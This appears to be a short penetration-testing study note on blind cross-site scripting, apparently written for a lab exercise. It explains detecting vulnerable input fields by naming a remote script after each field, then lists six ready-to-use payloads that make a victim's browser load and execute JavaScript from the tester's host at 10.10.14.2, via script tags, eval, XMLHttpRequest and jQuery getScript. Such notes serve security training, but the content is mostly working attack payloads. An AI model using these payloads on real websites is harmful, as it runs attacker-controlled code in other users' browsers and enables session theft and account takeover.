To know which input fields are vulnerable, we can try loading a remote `js` file from our machine and changing the request to be the name of the input field i.e. `<script src=http://OUR_IP/username></script>`


> [!NOTE] Note
> Blind XSS has a higher success rate with DOM XSS type of vulnerabilities because of the ability to read the source code and creating a payload based off of it.


## TEST ALL PAYLOADS
```js
<script src=http://10.10.14.2></script>
'><script src=http://10.10.14.2></script>
"><script src=http://10.10.14.2></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.2\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.2");a.send();</script>

<script>$.getScript("http://10.10.14.2")</script>
```

> [!NOTE] Note
> For registration forms, email fields are less likely to be vulnerable due to the format requirements being validated by front and back ends. Same with passwords as they'll be hashed
